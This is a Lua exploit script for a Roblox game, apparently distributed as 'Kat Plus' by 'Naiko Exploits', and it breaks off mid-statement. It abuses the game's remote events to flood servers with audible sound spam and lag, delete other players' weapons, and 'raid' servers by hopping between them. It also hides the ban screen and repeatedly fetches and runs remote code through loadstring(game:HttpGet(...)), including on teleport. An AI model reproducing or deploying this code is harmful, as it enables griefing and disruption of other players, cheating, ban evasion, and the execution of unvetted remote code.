-- Kat Plus Made by Naiko Exploits --

repeat task.wait() until game:IsLoaded() and task.wait(1.5)

if game:GetService("CoreGui"):FindFirstChild("Plus") then
	return warn("Script already running")
elseif tostring(game.GameId) == "254394801" then
	Instance.new("BoolValue",game:GetService("CoreGui")).Name = "Plus"
else
	return warn("Incorrect game")
end

-- General Variables --

local LocalPlayer = game:GetService("Players").LocalPlayer
local PlayerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui",20)
local MainUI = PlayerGui:WaitForChild("GameUI",10):WaitForChild("HUD",10)
local VersionUI = PlayerGui:WaitForChild("GameUI",10):WaitForChild("Interface",10):WaitForChild("BottomBar",10).TempXP
local UI = MainUI.Round.RoundDisplay.RoundEnd:Clone()
local Window = UI.Window
local Items = Window.Winner.Items
local Result = Window.Result
local Info = Window.Info
local Buttons = PlayerGui:WaitForChild("GameUI",10).Interface.SideButtons
local Credits = MainUI.WeaponContext:Clone()
local Button = Buttons:WaitForChild("SpectateButton",5):Clone()
local TweenService = game:GetService("TweenService")
local Settings = MainUI.Parent.Interface.SettingsPane
local Rarities = {Stock = Color3.fromRGB(255,255,255),Common = Color3.fromRGB(46,255,0),Rare = Color3.fromRGB(0,166,255),Epic = Color3.fromRGB(247, 6, 211),Unique = Color3.fromRGB(255,200,0),Legendary = Color3.fromRGB(245, 5, 0),Mythical = Color3.fromRGB(227,11,255)}
local CurrentSoundSequenceType = nil
local WeaponRemoveCooldown = false
local WeaponRemoveState = "Disabled"
local Banned = false
local Times = 0
local Version = 1.1

-- UI Creation --

local UIGradient = Instance.new("UIGradient")
UIGradient.Parent = Button
UIGradient.Rotation = 45
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(72, 255, 179)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(129, 160, 255))
})
local Scale = Instance.new("UIScale")
Scale.Scale = 0
Scale.Parent = Button

Button.Parent = Buttons
Button.Visible = true
Button.Name = "PlusButton"
Button:FindFirstChild("ButtonIcon").Image = "rbxassetid://17724539002"
Button.ImageColor3 = Color3.fromRGB(66, 116, 96)

Buttons.TradeButton.Visible = false -- why does it exist if its not gonna exist :skull:

UI.Parent = MainUI.Round.RoundDisplay
UI.Visible = false
UI.Name = "PlusUI"
Window.UISizeConstraint:Destroy()
Window.Winner.Portrait.Visible = false
Window.Size = UDim2.new(0.4, 0, 0.6, 0)
Window.UIAspectRatioConstraint.AspectRatio = 0.9
Window.Winner.Size = UDim2.new(1,0,0.8,0)
Info.Position = UDim2.new(0.5,0,0.775,0)
Info.AnchorPoint = Vector2.new(0.5,0)
Info.Size = UDim2.new(1,-1,0.15,0)
Info.Confirm.Label.Text = "Play"
Info.Confirm.Size = UDim2.new(0.25,0,0.6,0)
Info.Confirm.Position = UDim2.new(0.98,0,0.5,0)
Info.BackgroundColor3 = Color3.fromRGB(47, 57, 52)
Info.Confirm.AnchorPoint = Vector2.new(1,0.5)
Info.Rewards.Visible = false
Info.Rank.Visible = false
local ServerButtons = Info:Clone()
local TextBox = Instance.new("TextBox")
local UIStroke = Instance.new("UIStroke")
Info.UIGradient.Rotation = -90
UIStroke.Parent = TextBox
UIStroke.LineJoinMode = Enum.LineJoinMode.Miter
UIStroke.Color = Color3.fromRGB(115,115,115)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Thickness = 2
local UIGradient2 = Info.Confirm.UIGradient:Clone()
UIGradient2.Parent = UIStroke
local Confirm = ServerButtons.Confirm
Confirm.Size = UDim2.new(0.35,0,0.95,0)
Confirm.Position = UDim2.new(0.3,0,0.35,0)
Confirm.BackgroundColor3 = Color3.fromRGB(75,75,75)
Confirm.AnchorPoint = Vector2.new(0.5,0.5)
Confirm.UIGradient:Destroy()
Confirm.Label.Text = "Lag server"
Confirm.Label.TextStrokeTransparency = 0.9
UIStroke:Clone().Parent = Confirm
local Confirm2 = Confirm:Clone()
Confirm2.Parent = ServerButtons
Confirm2.Label.Text = "Raid servers"
Confirm2.Position = UDim2.new(0.7,0,0.35,0)

ServerButtons.Name = "ServerButtons"
ServerButtons.Parent = Window
ServerButtons.Position = UDim2.new(0.5,0,0.925,0)
ServerButtons.Size = UDim2.new(1,-1,0.075,0)

TextBox.Parent = Info
TextBox.Size = UDim2.new(0.5,0,0.6,0)
TextBox.Position = UDim2.new(0.02,0,0.5,0)
TextBox.AnchorPoint = Vector2.new(0,0.5)
TextBox.BackgroundColor3 = Color3.fromRGB(75,75,75)
TextBox.TextColor3 = Color3.fromRGB(255,255,255)
TextBox.PlaceholderColor3 = Color3.fromRGB(125,125,125)
TextBox.TextStrokeTransparency = 0.9
TextBox.TextScaled = true
TextBox.PlaceholderText = "Sound ID"
TextBox.Text = ""
TextBox.ZIndex = 8
TextBox.Name = "SoundId"
Items.UIListLayout:Destroy()
Items.Size = UDim2.new(1,0,1,0)
Items.Position = UDim2.new(0,0,0,0)
local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.Parent = Items
UIGridLayout.CellPadding = UDim2.new(0.015, 0, 0.015, 0)
UIGridLayout.CellSize = UDim2.new(0.2377, 0, 0.277, 0)
VersionUI.barHolder.Visible = false
VersionUI.level.Text = "V" .. Version
VersionUI.level:GetPropertyChangedSignal("Text"):Connect(function() VersionUI.level.Text = "V" .. Version end)
VersionUI.level.TextScaled = false
VersionUI.level.TextSize = 35

local TextBox2 = TextBox:Clone()
TextBox2.Parent = Info
TextBox2.AnchorPoint = Vector2.new(0.5,0.5)
TextBox2.Size = UDim2.new(0.175, 0,0.6, 0)
TextBox2.Position = UDim2.new(0.625,0,0.5,0)
TextBox2.Name = "Volume"
TextBox2.PlaceholderText = "Volume"

Result.BackgroundColor3 = Color3.fromRGB(47, 57, 52)
Result.NotableMention.Text = "From naiko exploits"
Result.NotableMention.TextStrokeTransparency = 0.5
Result.Title.Text = "Kat Plus"
Result.Title.TextColor3 = Color3.fromRGB(12, 255, 139)
Result.Title.TextStrokeTransparency = 0.25

Credits.Parent = MainUI
Credits.Name = "OriginalScriptCreator"
Credits.Label.Text = "Script made by naiko exploits"
Credits.Label.TextTransparency = 1
Credits.Label.TextStrokeTransparency = 1
Credits.Label.TextScaled = false
Credits.Label.TextSize = 28
Credits.Visible = false
Credits.Label.Fade.ImageTransparency = 1

for i,v in pairs(Items:GetChildren()) do
	if v:IsA("Frame") and v:FindFirstChild("ItemName") and not (Times > 0) then
		Times = Times + 1
		local TextLabel = v:FindFirstChild("ItemName")
		TextLabel.Size = UDim2.new(1,0,0.254,0)
		TextLabel.Position = UDim2.new(1,0,1,0)
		TextLabel.TextXAlignment = Enum.TextXAlignment.Center
	elseif v:IsA("Frame") then
		v:Destroy()
	end
end

Settings.Options.CanvasSize = UDim2.new(0,0,1.8,0)

for i,v in Settings.Options:GetChildren() do
	if v:IsA("Frame") and v.Name ~= "SprayIcon" then
		v.Size = UDim2.new(1,0,0,90)
	elseif v.Name == "SprayIcon" then
		v.Size = UDim2.new(1,0,0,120)
	end
end

local WeaponRemoveSetting = Settings.Options:FindFirstChild("KillFeedEnabled"):Clone()
WeaponRemoveSetting.SettingName.Text = "Weapon Remover/Deleter"
WeaponRemoveSetting.Main.ModeSelected.Text = "Disabled"
WeaponRemoveSetting.Parent = Settings.Options


local OriginFrame = Items:FindFirstChildOfClass("Frame")
local TextButton = Instance.new("TextButton")
local UIGradient3 = Instance.new("UIGradient")
TextButton.Text = ""
TextButton.BackgroundTransparency = 1
TextButton.Size = UDim2.new(1,0,1,0)
TextButton.ZIndex = 250
TextButton.Parent = OriginFrame
OriginFrame.Visible = false
UIGradient3.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(215,215,215))
})
UIGradient3.Rotation = 90
UIGradient3.Parent = OriginFrame.ItemIcon
OriginFrame.ItemIcon.Image = "rbxassetid://17698072241"
local Template = OriginFrame:Clone()
local TemplateButton = Template.TextButton
local TemplateColor = Rarities["Stock"]
Template.ItemIcon.ImageColor3 = TemplateColor
Template.BorderColor3 = TemplateColor
Template.ItemName.TextColor3 = TemplateColor
Template.Parent = Items
Template.ItemName.Text = "Countdown"
Template.Visible = true

local Template2 = OriginFrame:Clone()
local Template2Button = Template2.TextButton
local Template2Color = Rarities["Legendary"]
Template2.ItemIcon.ImageColor3 = Template2Color
Template2.BorderColor3 = Template2Color
Template2.ItemName.TextColor3 = Template2Color
Template2.Parent = Items
Template2.ItemName.Text = "Jumpscare"
Template2.Visible = true

local Template3 = OriginFrame:Clone()
local Template3Button = Template3.TextButton
local Template3Color = Rarities["Epic"]
Template3.ItemIcon.ImageColor3 = Template3Color
Template3.BorderColor3 = Template3Color
Template3.ItemName.TextColor3 = Template3Color
Template3.Parent = Items
Template3.ItemName.Text = "Error all"
Template3.Visible = true

local Template4 = OriginFrame:Clone()
local Template4Button = Template4.TextButton
local Template4Color = Rarities["Stock"]
Template4.ItemIcon.ImageColor3 = Template4Color
Template4.BorderColor3 = Template4Color
Template4.ItemName.TextColor3 = Template4Color
Template4.Parent = Items
Template4.ItemName.Text = "Relaxing music"
Template4.Visible = true

local Template5 = OriginFrame:Clone()
local Template5Button = Template5.TextButton
local Template5Color = Rarities["Unique"]
Template5.ItemIcon.ImageColor3 = Template5Color
Template5.BorderColor3 = Template5Color
Template5.ItemName.TextColor3 = Template5Color
Template5.Parent = Items
Template5.ItemName.Text = "Boom headshot"
Template5.Visible = true

local Template6 = OriginFrame:Clone()
local Template6Button = Template6.TextButton
local Template6Color = Rarities["Common"]
Template6.ItemIcon.ImageColor3 = Template6Color
Template6.BorderColor3 = Template6Color
Template6.ItemName.TextColor3 = Template6Color
Template6.Parent = Items
Template6.ItemName.Text = "Pop"
Template6.Visible = true

local Template7 = OriginFrame:Clone()
local Template7Button = Template7.TextButton
local Template7Color = Rarities["Stock"]
Template7.ItemIcon.ImageColor3 = Template7Color
Template7.BorderColor3 = Template7Color
Template7.ItemName.TextColor3 = Template7Color
Template7.Parent = Items
Template7.ItemName.Text = "Add sound"
Template7.ItemIcon.Image = "rbxassetid://12072054746"
Template7.Visible = true

-- Script functions --

function ColoredPrint(Text:string,color:Color3,Icon:table)
    task.spawn(function()
    local TextFinder = "‎".. Text.. (string.sub(game:GetService("HttpService"):GenerateGUID(false),1,10))
    print(TextFinder)
    game.CoreGui:WaitForChild("DevConsoleMaster",1000):WaitForChild("DevConsoleWindow",1000):WaitForChild("DevConsoleUI",1000):WaitForChild("MainView",1000)
    local function update(Parent)
        local loadingLabel = nil
                for index,label in pairs(Parent:GetDescendants()) do 
                     if label:IsA("TextLabel") and string.find(label.Text,TextFinder,1,true) ~= nil then 
                        loadingLabel = label 
                        loadingLabel:SetAttribute("hasbefore",true)
                        loadingLabel.RichText = true
                        local originalTime = string.sub(label.text,1,11)
                        loadingLabel.Text = string.format("<font color='rgb(%s,%s,%s)' size='15'>%s %s </font>", math.round(color.R*255),math.round(color.G*255),math.round(color.B*255),originalTime,Text)
                        if Icon == nil then
                            elseif type(Icon[1]) == type(0) then
                                if Icon[2] == false then
                                    loadingLabel.Parent.image.Image = "rbxassetid://" .. tostring(Icon[1])
                                    loadingLabel.Parent.image.ImageColor3 = Color3.new(255,255,255)
                                    else
                                        loadingLabel.Parent.image.Image = "rbxassetid://" .. tostring(Icon[1])
                                        loadingLabel.Parent.image.ImageColor3 = color
                                    end
                            elseif Icon[1]:lower() == "error" or Icon[1]:lower() == "err" or Icon[1]:lower() == "fail" then
                            if Icon[2] == false then
                                loadingLabel.Parent.image.Image = "rbxasset://textures/DevConsole/Error.png"
                                loadingLabel.Parent.image.ImageColor3 = Color3.new(255,255,255)
                                else
                                    loadingLabel.Parent.image.Image = "rbxassetid://97467062933153"
                                    loadingLabel.Parent.image.ImageColor3 = color
                                end
                            elseif Icon[1]:lower() == "information" or Icon[1]:lower() == "info" then
                            if Icon[2] == false then
                                loadingLabel.Parent.image.Image = "rbxasset://textures/DevConsole/Info.png"
                                loadingLabel.Parent.image.ImageColor3 = Color3.new(255,255,255)
                                else
                                    loadingLabel.Parent.image.Image = "rbxassetid://98895588220731"
                                    loadingLabel.Parent.image.ImageColor3 = color
                                end
                            elseif Icon[1]:lower() == "warning" or Icon[1]:lower() == "warn"  then
                            if Icon[2] == false then
                                loadingLabel.Parent.image.Image = "rbxasset://textures/DevConsole/Warning.png"
                                loadingLabel.Parent.image.ImageColor3 = Color3.new(255,255,255)
                                else
                                    loadingLabel.Parent.image.Image = "rbxassetid://129253285072281"
                                    loadingLabel.Parent.image.ImageColor3 = color
                                end
                            elseif Icon[1]:lower() == "plus" or Icon[1]:lower() == "extra" then
                                        loadingLabel.Parent.image.Image = "rbxassetid://127360009371476"
                                        loadingLabel.Parent.image.ImageColor3 = color
                            elseif Icon[1]:lower() == "success" or Icon[1]:lower() == "check" or Icon[1]:lower() == "tick" then
                                if Icon[2] == false then
                                loadingLabel.Parent.image.Image = "rbxassetid://75097763556603"
                                loadingLabel.Parent.image.ImageColor3 = Color3.new(255,255,255)
                                else
                                    loadingLabel.Parent.image.Image = "rbxassetid://87889653826033"
                                    loadingLabel.Parent.image.ImageColor3 = color
                                end
                            end
                            loadingLabel.Parent.image:GetPropertyChangedSignal("Image"):Once(function()
                                loadingLabel.Parent.image.ImageColor3 = Color3.new(255,255,255)
                            end)
                        break
                    end 
                end 
            end
            task.wait(0.009)
            update(game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI:WaitForChild("MainView"))
            local Done = 0
            task.spawn(function()
                if game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI:WaitForChild("MainView"):WaitForChild("ClientLog",5).CanvasSize.Y.Offset >= 8500 then
                  game:GetService("LogService").MessageOut:Connect(function(message, messageType)
                    if Done < 22 then
            task.wait(0.01)
            Done = Done + 1
                    update(game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI:WaitForChild("MainView"))
                    end
    end)
end
    end)
            game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI:WaitForChild("MainView"):WaitForChild("ClientLog",5).ChildAdded:Connect(function(child2)
                update(child2)
         end)
game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI.ChildAdded:Connect(function(child)
    if child.Name == "MainView" then
        task.wait()
        update(child)
        child:WaitForChild("ClientLog",5).ChildAdded:Connect(function(child2)
           update(child2)
    end)
end
end)
end)
end

function Notify(Message,Time,FadeTime)
	task.spawn(function()
FadeTime = tonumber(FadeTime) or 0.3
Time = tonumber(Time) or 6
if type(Message) == type("") then
local Notification = Credits:Clone()
Notification.Parent = Credits.Parent
Notification.Name = "Notification"
Notification.Label.Text = tostring(Message)
Notification.Label.TextTransparency = 1
Notification.Label.TextStrokeTransparency = 1
Notification.Label.TextScaled = false
Notification.Label.TextSize = 28
Notification.Visible = true
Notification.Label.Fade.ImageTransparency = 1
TweenService:Create(Notification.Label,TweenInfo.new(FadeTime,Enum.EasingStyle.Linear),{TextTransparency = 0,TextStrokeTransparency = 0.5,}):Play()
TweenService:Create(Notification.Label.Fade,TweenInfo.new(FadeTime,Enum.EasingStyle.Linear),{ImageTransparency = 0.75}):Play()
task.wait(Time)
TweenService:Create(Notification.Label,TweenInfo.new(FadeTime,Enum.EasingStyle.Linear),{TextTransparency = 1,TextStrokeTransparency = 1,}):Play()
TweenService:Create(Credits.Label.Fade,TweenInfo.new(FadeTime,Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
task.wait(FadeTime)
Notification:Destroy()
else
	warn("Failed to show notification")
end
end)
end

function ServerHop()
local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
do
    local string = string
    lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte = 
        string.lower,
        string.upper,
        string.find,
        string.split, 
        string.sub,
        string.format,
        string.len,
        string.match,
        string.gmatch,
        string.gsub,
        string.byte
end
         local   order = "Desc"
        local Servers = {};
        local url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100", game.PlaceId, order);
        local starting = tick();
        repeat
            local good, result = pcall(function()
                return game:HttpGet(url);
            end);
            if (not good) then
                wait(2);
                continue;
            end
            local decoded = game:GetService("HttpService"):JSONDecode(result);
            if (#decoded.data ~= 0) then
                Servers = decoded.data
                for i, v in pairs(Servers) do
                    if (v.maxPlayers and v.playing and v.maxPlayers - 1 > v.playing and v.id ~= game.JobId) then
                        Server = v
                        break;
                    end
                end
                if (Server) then
                    break;
                end
            end
            url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&cursor=%s", game.PlaceId, order, decoded.nextPageCursor);
        until tick() - starting >= 600;
        if (not Server or #Servers == 0) then
            return 
        end
			local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
			if queue_on_teleport ~= nil then
    		queue_on_teleport("loadstring(game:HttpGet(('https://raw.githubusercontent.com/NaikoScript/Kat-Plus/main/Script')))()")
			task.wait()
		end
		ChangeData("TargetServer.JobId",tostring(Server.id),true)
		task.wait()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Server.id);    
        
    end

function S(ID,instance,Volume:number,Looped:boolean,LocalVolume:number)
local Data = {"PlaySound",LocalPlayer.Name,"rbxassetid://" .. ID,{instance},tonumber(Volume),Looped}
game.ReplicatedStorage.GameEvents.Misk.ReplicateSound:FireServer(Data)
local Sound = Instance.new("Sound")
Sound.Parent = instance
Sound.SoundId = "rbxassetid://" .. tostring(ID)
Sound.Volume = tonumber(LocalVolume) or tonumber(Volume)
Sound.Looped = Looped
Sound:Play()
Sound.Stopped:Wait()
Sound:Destroy()
end

function RT(Tool)
if Tool:FindFirstChild("ClientEvent") then
Tool:FindFirstChild("ClientEvent"):FireServer("ConfirmDestruction",{})
end
end

function RPT(Player,ToolType)
	if ToolType == nil then
		ToolType = "All"
	end
if Player.Character ~= nil then
for i,v in pairs(Player.Character:GetChildren()) do
	if v:IsA("Tool") then
		if ToolType == "All" then
		if v.Name == "Knife" or v.Name == "Revolver" then
			RT(v)
		end
	elseif ToolType == "Gun" or ToolType == "Revolver" then
		if v.Name == "Revolver" then
			RT(v)
		end
	elseif ToolType == "Knife" then
		if v.Name == "Knife" then
			RT(v)
		end
	end
end
end
for i,v in pairs(Player.Backpack:GetChildren()) do
	if v:IsA("Tool") then
		if ToolType == "All" then
			if v.Name == "Knife" or v.Name == "Revolver" then
				RT(v)
			end
		elseif ToolType == "Gun" or ToolType == "Revolver" then
			if v.Name == "Revolver" then
				RT(v)
			end
		elseif ToolType == "Knife" then
			if v.Name == "Knife" then
				RT(v)
			end
		end
	end
	end
end
end

function QS(ID)
local Data = {"PlaySound",LocalPlayer.Name,("rbxassetid://" .. tostring(ID)),{workspace},"1",false}
game.ReplicatedStorage.GameEvents.Misk.ReplicateSound:FireServer(Data)
end

function LR()
	task.spawn(function()
	for i = 1,10000 do
		local Data = {"PlaySound",game.Players.LocalPlayer.Name,"rbxassetid://1843497734",{workspace,workspace,workspace,workspace,workspace,workspace,workspace,workspace},0,true}
		game.ReplicatedStorage.GameEvents.Misk.ReplicateSound:FireServer(Data)
		end
	end)
end

function Raid()
task.spawn(function()
while task.wait(math.random(10,20)) do
Notify("Attempting to change servers (from raid)",2.5,0.5)
ServerHop()
end
end)
task.spawn(function()
for i = 1,250 do
	task.wait(0.05)
	task.spawn(function()
	S(6600188325,workspace,10,true,0.02)
end)
	task.wait()
end
end)
task.spawn(function()
while task.wait(0.03) do
	for i,v in pairs(game.Players:GetPlayers()) do
				RPT(v)
			end
end
end)
end

-- Data --

function DefaultData(Path,Option)
	if isfile("NaikoScript/KatPlus/" .. Path) ~= false then
		return ColoredPrint("Option already exists",Color3.fromRGB(252,210,150),{"info",true})
	else
		writefile("NaikoScript/KatPlus/" .. Path,Option)
		return ColoredPrint("Set default data",Color3.fromRGB(125,230,75),{"success",true})
	end
end
	
function ChangeData(Path,Option,WithFolder)
	if WithFolder == false then
		if isfile(Path) ~= false then
			return writefile(Path,Option)
		end
	else 
		if isfile("NaikoScript/KatPlus/" .. Path) ~= false then
			return writefile("NaikoScript/KatPlus/" .. Path,Option)
		end
	end
end

function ReturnData(Path,WithFolder)
	if WithFolder == false then
		if isfile(Path) ~= false then
			return readfile(Path)
		end
	else
		if isfile("NaikoScript/KatPlus/" .. Path) ~= false then
			return readfile("NaikoScript/KatPlus/" .. Path)
		end
	end
end

if not isfolder("NaikoScript") and not isfolder("NaikoScript/KatPlus") then
	makefolder("NaikoScript")
	makefolder("NaikoScript/KatPlus")
	UserType = 1
elseif isfolder("NaikoScript") and not isfolder("NaikoScript/KatPlus") then
	UserType = 2
	makefolder("NaikoScript/KatPlus")
elseif isfolder("NaikoScript") and isfolder("NaikoScript/KatPlus") then
	UserType = 3
end
DefaultData("ToolDelete.txt","Disabled")
DefaultData("Headshot.txt","false")
DefaultData("ServerHop.txt","false")
DefaultData("TargetServer.JobId","None")
local ValueUser = Instance.new("NumberValue")
ValueUser.Parent = game:GetService("CoreGui")
ValueUser.Name = "UserType"
ValueUser.Value = UserType

-- General scripting --

if MainUI.Parent.Menu.MainMenuUI.Banned.Visible == true then
	Banned = true
	local BannedUI = MainUI.Parent.Menu.MainMenuUI.Banned
	BannedUI.Splash.Image = "rbxassetid://18423397075"
	BannedUI.Splash.Splash.Visible = false
	BannedUI.TimeLeft.Text = "time is now"
	local BanMessages = {"Dw bro i got u","they fr thought they could ban you","the unban is yours","trash ban system? totally not 💀"}
	BannedUI.TimeLeft.BanInfo.Text = BanMessages[math.random(1,#BanMessages)]
	if UserType == 3 then
	task.wait(1.5)
	else
	task.wait(4)
	end
	TweenService:Create(BannedUI.Splash,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
	TweenService:Create(BannedUI.Overlay,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{BackgroundTransparency = 1}):Play()
	TweenService:Create(BannedUI.TimeLeft,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{TextTransparency = 1}):Play()
	TweenService:Create(BannedUI.TimeLeft.BanInfo,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{TextTransparency = 1}):Play()
	task.wait(0.7)
end
TweenService:Create(Buttons.UISizeConstraint,TweenInfo.new(0.45,Enum.EasingStyle.Back),{MaxSize = Vector2.new(120,math.huge)}):Play()
TweenService:Create(Scale,TweenInfo.new(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Scale = 1}):Play()

Button.MouseEnter:Connect(function()
Button.ImageColor3 = Color3.fromRGB(73, 141, 113)
end)

Button.MouseLeave:Connect(function()
Button.ImageColor3 = Color3.fromRGB(66, 116, 96)
end)

Button.MouseButton1Click:Connect(function()
UI.Visible = not UI.Visible
end)
task.spawn(function()
task.wait(1)
Credits.Visible = true
TweenService:Create(Credits.Label,TweenInfo.new(0.3,Enum.EasingStyle.Linear),{TextTransparency = 0,TextStrokeTransparency = 0.5,}):Play()
TweenService:Create(Credits.Label.Fade,TweenInfo.new(0.3,Enum.EasingStyle.Linear),{ImageTransparency = 0.75}):Play()
task.wait(5)
TweenService:Create(Credits.Label,TweenInfo.new(0.3,Enum.EasingStyle.Linear),{TextTransparency = 1,TextStrokeTransparency = 1,}):Play()
TweenService:Create(Credits.Label.Fade,TweenInfo.new(0.3,Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
task.wait(0.3)
Credits.Visible = false
end)

local Lagging = false
Confirm.Button.MouseButton1Click:Connect(function()
	if Lagging ~= true then 
			Lagging = true 
			LR()
			task.spawn(function()
			Notify("Trying to lag everyone else in the server (by fps) your ping might increase",5,1)
			task.wait(5.2)
			Notify("This process will take some time...",2.25,0.75)
			end)
			task.wait(1.75)
			while task.wait(9) do
				Notify("Sending lag requests...",1.75,0.75)
				LR()
			end
		else
			Notify("You are already lagging the server",5,1)
	end
	end)

Confirm2.Button.MouseButton1Click:Connect(function()
	if Lagging == true then
		Notify("You are unable to raid the servers while you are lagging the server",5,1)
	else
		Raid()
	end
end)

Info.Confirm.Button.MouseButton1Click:Connect(function()
	if Info.Confirm.Label.Text == "Add" then
			makefolder("NaikoScript/KatPlus/CustomSound")
			DefaultData("CustomSound/SoundId.txt",tostring(TextBox.Text))
			DefaultData("CustomSound/SoundVolume.txt",tostring(TextBox2.Text))
			local RarityStrings = {"Stock","Common","Rare","Epic","Unique","Legendary","Mythical"}
			DefaultData("CustomSound/SoundRarity.txt",RarityStrings[math.random(1,#RarityStrings)])
			local Sound = game:GetService("MarketplaceService"):GetProductInfo(tonumber(TextBox.Text))
			task.wait(0.05) 
			if Sound.Name ~= nil and type(Sound.Name) == type("") then
			DefaultData("CustomSound/SoundName.txt",tostring(Sound.Name))
			else
			DefaultData("CustomSound/SoundName.txt","Unknown")
			end
			task.wait(0.05)
			Info.Confirm.Label.Text = "Play"
			Template7Color = Rarities[ReturnData("CustomSound/SoundRarity.txt")]
			Template7.ItemIcon.ImageColor3 = Template7Color
Template7.BorderColor3 = Template7Color
Template7.ItemName.TextColor3 = Template7Color
Template7.ItemName.Text = ReturnData("CustomSound/SoundName.txt")
Template7.ItemIcon.Image = "rbxassetid://17698072241"
	else
	if TextBox.Text == "CustomSoundSequence" then
			if CurrentSoundSequenceType == 1 then
				for i,v in pairs(game.Players:GetPlayers()) do
					task.wait(math.random(1,100)/400)
					task.spawn(function()
					if v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") then
					S(1304562514,v.Character:FindFirstChild("HumanoidRootPart"),tostring(TextBox2.Text),false)
					end
					end)
				end
		end
		elseif TextBox.Text == "Raid" or TextBox.Text == "raid" then
			--Raid()
			Notify("This feature has been removed please look at the button above 💀",5.5,1)
		else	
 			S(TextBox.Text,workspace,tostring(TextBox2.Text),false)
	end
end
end)
task.spawn(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/NaikoScript/r/main/r3.lua')))()
end)
for _, Selection in pairs (Settings.Options:GetChildren()) do
	if Selection:IsA("GuiBase2d") then
		local Parent = Selection:FindFirstAncestorWhichIsA("GuiBase")
		if Parent ~= nil then
		Selection.Size = UDim2.new(Selection.Size.X.Offset/Parent.AbsoluteSize.X + Selection.Size.X.Scale, 0, (Selection.Size.Y.Offset/Parent.AbsoluteSize.Y + Selection.Size.Y.Scale) / Settings.Options.CanvasSize.Y.Scale, 0)
		--Selection.Position = UDim2.new(Selection.Position.X.Offset/Parent.AbsoluteSize.X + Selection.Position.X.Scale, 0, (Selection.Position.Y.Offset/Parent.AbsoluteSize.Y  + Selection.Position.Y.Scale) / , 0)
		end	
		end
end
task.spawn(function()
while task.wait(math.random(160,360)) do
	Notify("Don't forget to join my server! | discord.gg/aHm5hsfHGr",16,1)
end
end)
task.spawn(function()
local	function DoForEveryone(inputtype)
		for i,v in pairs(game.Players:GetPlayers()) do
			RPT(v,inputtype)
		end
	end
	while true do
		task.wait()
		if WeaponRemoveCooldown == false then
		if WeaponRemoveState == "Disabled" then
		
		elseif WeaponRemoveState == "Guns" then
		DoForEveryone("Knife")
		elseif WeaponRemoveState == "Knifes" then
		DoForEveryone("Gun")
		elseif WeaponRemoveState == "Both" then
		DoForEveryone("All")
		end
	end
	end
end)

WeaponRemoveSetting.SettingHitbox.MouseButton1Up:Connect(function()
	Notify("This will be applied in 5 seconds",3.6,1)
	if WeaponRemoveSetting.Main.ModeSelected.Text == "Disabled" then
		task.spawn(function()
			WeaponRemoveCooldown = true
			task.wait(5)
			if WeaponRemoveState == "Guns" then
				WeaponRemoveCooldown = false
				Notify("Setting applied to remove all knifes",2.5,1)
			end
		end)
		WeaponRemoveSetting.Main.ModeSelected.Text = "Keep Guns only"
		WeaponRemoveState = "Guns"
	elseif WeaponRemoveSetting.Main.ModeSelected.Text == "Keep Guns only" then
		task.spawn(function()
			WeaponRemoveCooldown = true
			task.wait(5)
			if WeaponRemoveState == "Knifes" then
				WeaponRemoveCooldown = false
				Notify("Setting applied to remove all guns",2.5,1)
			end
		end)
		WeaponRemoveSetting.Main.ModeSelected.Text = "Keep Knifes only"
		WeaponRemoveState = "Knifes"

		elseif WeaponRemoveSetting.Main.ModeSelected.Text == "Keep Knifes only" then
			task.spawn(function()
				WeaponRemoveCooldown = true
				task.wait(5)
				if WeaponRemoveState == "Both" then
					WeaponRemoveCooldown = false
					Notify("Setting applied to remove all weapons",2.5,1)
				end
			end)
				WeaponRemoveSetting.Main.ModeSelected.Text = "Enabled"
				WeaponRemoveState = "Both"

			elseif WeaponRemoveSetting.Main.ModeSelected.Text == "Enabled" then
				task.spawn(function()
					WeaponRemoveCooldown = true
					task.wait(5)
					if WeaponRemoveState == "Disabled" then
						WeaponRemoveCooldown = false
						Notify("Setting disabled",2.5,1)
					end
				end)
				WeaponRemoveSetting.Main.ModeSelected.Text = "Disabled"
				WeaponRemoveState = "Disabled"
	end
end)

TemplateButton.MouseButton1Click:Connect(function()
	TextBox.Text = "1837167368"
	TextBox2.Text = "1.5"
end)

Template2Button.MouseButton1Click:Connect(function()
	TextBox.Text = "6600188325"
	TextBox2.Text = "3"
end)

Template3Button.MouseButton1Click:Connect(function()
	TextBox.Text = "CustomSoundSequence"
	TextBox2.Text = "1"
	CurrentSoundSequenceType = 1
end)

Template4Button.MouseButton1Click:Connect(function()
	TextBox.Text = "1848354536"
	TextBox2.Text = "1.5"
end)

Template5Button.MouseButton1Click:Connect(function()
	TextBox.Text = "7154294653"
	TextBox2.Text = "4"
end)

Template6Button.MouseButton1Click:Connect(function()
	TextBox.Text = "6892830182"
	TextBox2.Text = "6"
end)

if ReturnData("CustomSound/SoundId.txt") ~= nil then
